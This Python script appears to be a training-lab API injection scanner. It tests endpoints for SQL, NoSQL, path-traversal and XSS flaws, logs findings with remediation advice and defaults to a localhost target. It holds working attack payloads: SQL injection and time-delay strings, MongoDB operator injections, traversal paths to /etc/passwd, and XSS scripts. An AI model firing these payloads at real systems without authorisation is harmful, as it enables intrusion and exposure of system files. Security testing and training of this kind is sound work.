#!/usr/bin/env python3
"""
API Penetration Testing Lab - Intermediate Lab 2: Targeted API Injection Attacks
Industry-Grade API Penetration Testing Framework

This module performs comprehensive injection security assessments across REST endpoints:
1. SQL Injection (Error-Based, Boolean, and Time-Based Blind Delays)
2. NoSQL Query & Operator Injection (MongoDB/Document Store Tampering)
3. Local File Inclusion (LFI) & Path Traversal via API Handlers
4. Stored/Reflected Cross-Site Scripting (API Context XSS)
5. JSON Body Injection & Type Juggling
"""

import argparse
import json
import re
import sys
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import requests


class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


class APIInjectionTester:
    """Comprehensive scanner and test harness for API injection vulnerabilities."""

    def __init__(
        self,
        base_url: str,
        auth_token: Optional[str] = None,
        timeout: int = 5,
    ):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "SecOps-APIInjectionAuditor/2.0"})
        if auth_token:
            auth_header = auth_token if auth_token.startswith("Bearer ") else f"Bearer {auth_token}"
            self.session.headers.update({"Authorization": auth_header})

        self.findings: List[Dict[str, Any]] = []

    # ----------------------------------------------------------------------
    # Detection Signatures & Regex Matrices
    # ----------------------------------------------------------------------
    SQL_ERRORS = [
        r"syntax error in query expression",
        r"mysql_fetch",
        r"You have an error in your SQL syntax",
        r"pg_query\(\)",
        r"unclosed quotation mark after the character string",
        r"sqlite3\.OperationalError",
        r"ORA-00933",
        r"SQLSTATE\[",
        r"Microsoft OLE DB Provider for SQL Server",
    ]

    LFI_SIGNATURES = [
        r"root:.*:0:0:",
        r"\[boot loader\]",
        r"\[extensions\]",
        r"; for 16-bit app support",
        r"root:x:0:0:root:/root:/bin/bash",
    ]

    XSS_PAYLOADS = [
        "<script>alert('SEC_XSS')</script>",
        "\"-alert('SEC_XSS')-\"",
        "<img src=x onerror=alert('SEC_XSS')>",
        "<svg/onload=alert('SEC_XSS')>",
    ]

    def log_finding(
        self,
        test_type: str,
        endpoint: str,
        method: str,
        param: str,
        payload: Any,
        severity: str,
        evidence: str,
        remediation: str,
    ):
        print(f"\n{Colors.RED}[CRITICAL VULNERABILITY FOUND]{Colors.RESET} {Colors.BOLD}{test_type}{Colors.RESET}")
        print(f"  ├─ Endpoint: {method} {endpoint}")
        print(f"  ├─ Parameter: {param}")
        print(f"  ├─ Payload: {payload}")
        print(f"  ├─ Severity: {Colors.RED}{severity}{Colors.RESET}")
        print(f"  ├─ Evidence: {evidence}")
        print(f"  └─ Remediation: {Colors.YELLOW}{remediation}{Colors.RESET}")

        self.findings.append(
            {
                "test_type": test_type,
                "endpoint": endpoint,
                "method": method,
                "parameter": param,
                "payload": str(payload),
                "severity": severity,
                "evidence": evidence,
                "remediation": remediation,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            }
        )

    # ----------------------------------------------------------------------
    # Test 1: SQL Injection (Error & Blind Time-Based)
    # ----------------------------------------------------------------------
    def test_sqli(self, endpoint: str, param: str, method: str = "GET"):
        url = f"{self.base_url}{endpoint}"

        # 1a. Error-based & Union Probing
        error_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL, NULL--",
            "\" OR \"\"=\"",
            "admin'--",
            "1; SELECT pg_sleep(0)--",
        ]

        for payload in error_payloads:
            try:
                if method == "GET":
                    res = self.session.get(url, params={param: payload}, timeout=self.timeout)
                else:
                    res = self.session.post(url, json={param: payload}, timeout=self.timeout)

                for pattern in self.SQL_ERRORS:
                    if re.search(pattern, res.text, re.IGNORECASE):
                        self.log_finding(
                            test_type="Error-Based SQL Injection",
                            endpoint=endpoint,
                            method=method,
                            param=param,
                            payload=payload,
                            severity="CRITICAL",
                            evidence=f"Matched SQL error pattern: '{pattern}'",
                            remediation="Ensure database operations use parameterized prepared statements or ORM bindings exclusively.",
                        )
                        return
            except requests.RequestException:
                pass

        # 1b. Time-based Blind SQL Injection
        delay = 4
        time_payloads = [
            f"1' AND (SELECT pg_sleep({delay}))--",
            f"1' WAITFOR DELAY '0:0:{delay}'--",
            f"1' AND (SELECT SLEEP({delay}))--",
        ]

        # Baseline latency
        try:
            t0 = time.time()
            if method == "GET":
                self.session.get(url, params={param: "1"}, timeout=self.timeout)
            else:
                self.session.post(url, json={param: "1"}, timeout=self.timeout)
            baseline = time.time() - t0
        except requests.RequestException:
            baseline = 0.2

        for t_payload in time_payloads:
            try:
                start = time.time()
                if method == "GET":
                    self.session.get(url, params={param: t_payload}, timeout=delay + self.timeout)
                else:
                    self.session.post(url, json={param: t_payload}, timeout=delay + self.timeout)
                elapsed = time.time() - start

                if elapsed >= (baseline + delay - 0.5):
                    self.log_finding(
                        test_type="Time-Based Blind SQL Injection",
                        endpoint=endpoint,
                        method=method,
                        param=param,
                        payload=t_payload,
                        severity="CRITICAL",
                        evidence=f"Induced execution delay of {elapsed:.2f}s (Baseline RTT: {baseline:.2f}s).",
                        remediation="Use parameterized queries for all query parameters and database filters.",
                    )
                    return
            except requests.Timeout:
                self.log_finding(
                    test_type="Time-Based Blind SQL Injection (Timeout)",
                    endpoint=endpoint,
                    method=method,
                    param=param,
                    payload=t_payload,
                    severity="CRITICAL",
                    evidence=f"Request timed out exceeding {delay + self.timeout}s due to injected delay function.",
                    remediation="Apply parameterized prepared statements.",
                )
                return
            except requests.RequestException:
                pass

    # ----------------------------------------------------------------------
    # Test 2: NoSQL Operator Injection
    # ----------------------------------------------------------------------
    def test_nosql_injection(self, endpoint: str, param: str):
        url = f"{self.base_url}{endpoint}"

        nosql_payloads = [
            {"$ne": "__non_existent_id__"},
            {"$gt": ""},
            {"$regex": "^admin.*"},
            {"$where": "1 == 1"},
        ]

        for payload in nosql_payloads:
            try:
                res = self.session.post(url, json={param: payload}, timeout=self.timeout)
                if res.status_code in [200, 201] and any(k in res.text.lower() for k in ["token", "success", "admin", "results"]):
                    self.log_finding(
                        test_type="NoSQL Operator Injection",
                        endpoint=endpoint,
                        method="POST",
                        param=param,
                        payload=payload,
                        severity="CRITICAL",
                        evidence=f"Endpoint accepted NoSQL filter object and returned authenticated or privileged data (Status: {res.status_code}).",
                        remediation="Enforce strict type validation schemas (reject nested objects for scalar string fields).",
                    )
                    return
            except requests.RequestException:
                pass

    # ----------------------------------------------------------------------
    # Test 3: Path Traversal & Local File Inclusion (LFI)
    # ----------------------------------------------------------------------
    def test_path_traversal(self, endpoint: str, param: str, method: str = "GET"):
        url = f"{self.base_url}{endpoint}"

        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for payload in lfi_payloads:
            try:
                if method == "GET":
                    res = self.session.get(url, params={param: payload}, timeout=self.timeout)
                else:
                    res = self.session.post(url, json={param: payload}, timeout=self.timeout)

                for pattern in self.LFI_SIGNATURES:
                    if re.search(pattern, res.text):
                        self.log_finding(
                            test_type="Path Traversal / Local File Inclusion (LFI)",
                            endpoint=endpoint,
                            method=method,
                            param=param,
                            payload=payload,
                            severity="CRITICAL",
                            evidence=f"Retrieved sensitive system file contents matching signature: '{pattern}'",
                            remediation="Avoid passing direct user input into file system calls. Use strict path canonicalization and index-based filename maps.",
                        )
                        return
            except requests.RequestException:
                pass

    # ----------------------------------------------------------------------
    # Test 4: API Context Cross-Site Scripting (XSS)
    # ----------------------------------------------------------------------
    def test_xss(self, endpoint: str, param: str, method: str = "GET"):
        url = f"{self.base_url}{endpoint}"

        for payload in self.XSS_PAYLOADS:
            try:
                if method == "GET":
                    res = self.session.get(url, params={param: payload}, timeout=self.timeout)
                else:
                    res = self.session.post(url, json={param: payload}, timeout=self.timeout)

                # Check if payload is reflected unencoded in an HTML/XML or unquoted JSON context
                content_type = res.headers.get("Content-Type", "").lower()
                if payload in res.text and ("text/html" in content_type or "application/xml" in content_type):
                    self.log_finding(
                        test_type="Reflected Cross-Site Scripting (XSS)",
                        endpoint=endpoint,
                        method=method,
                        param=param,
                        payload=payload,
                        severity="HIGH",
                        evidence=f"Payload was reflected unencoded in HTTP response with Content-Type: '{content_type}'",
                        remediation="Contextually encode output and set Content-Type to 'application/json' with 'X-Content-Type-Options: nosniff'.",
                    )
                    return
            except requests.RequestException:
                pass

    # ----------------------------------------------------------------------
    # Route Auditor & Parameter Resolver
    # ----------------------------------------------------------------------
    def audit_endpoint(self, endpoint: str):
        # Extract path parameters e.g., /api/v1/users/{id}
        path_params = re.findall(r"\{([a-zA-Z0-9_-]+)\}", endpoint)
        cleaned_endpoint = endpoint

        params_to_test = path_params if path_params else ["id", "q", "search", "user", "file", "filename", "username", "query"]

        print(f"\n{Colors.BLUE}[*] Auditing: {endpoint} (Parameters: {', '.join(params_to_test)}){Colors.RESET}")

        for param in params_to_test:
            # Test GET
            target_ep = re.sub(r"\{[a-zA-Z0-9_-]+\}", "1", cleaned_endpoint)
            self.test_sqli(target_ep, param, method="GET")
            self.test_path_traversal(target_ep, param, method="GET")
            self.test_xss(target_ep, param, method="GET")

            # Test POST
            self.test_sqli(target_ep, param, method="POST")
            self.test_nosql_injection(target_ep, param)
            self.test_path_traversal(target_ep, param, method="POST")

    def run(self, endpoints: List[str], report_file: Optional[str] = None):
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD} INTERMEDIATE LAB 2: TARGETED API INJECTION AUDITOR{Colors.RESET}")
        print(f" Target Host: {self.base_url}")
        print(f" Total Endpoints to Audit: {len(endpoints)}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")

        for ep in endpoints:
            normalized_ep = ep if ep.startswith("/") else f"/{ep}"
            self.audit_endpoint(normalized_ep)

        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}AUDIT SUMMARY{Colors.RESET}")
        print(f"Total Injection Vulnerabilities Discovered: {len(self.findings)}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")

        if report_file:
            with open(report_file, "w") as f:
                json.dump(self.findings, f, indent=4)
            print(f"\n[+] Detailed JSON report written to: {report_file}")


def load_endpoints(file_path: Optional[str] = None) -> List[str]:
    if file_path:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return [
        "/api/v1/search",
        "/api/v1/users/{id}",
        "/api/v1/auth/login",
        "/api/v1/download",
        "/api/v1/documents",
        "/api/v1/items",
    ]


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="API Penetration Testing - Intermediate Injection Scanner")
    parser.add_argument("--url", default="http://localhost:8080", help="Base URL of target API (default: http://localhost:8080)")
    parser.add_argument("--auth", help="Authentication token (Bearer token or raw API key)")
    parser.add_argument("--endpoints", help="File containing list of endpoints to audit")
    parser.add_argument("--report", help="Output path for JSON vulnerability report")
    args = parser.parse_args()

    endpoint_list = load_endpoints(args.endpoints)
    tester = APIInjectionTester(base_url=args.url, auth_token=args.auth)
    tester.run(endpoints=endpoint_list, report_file=args.report)
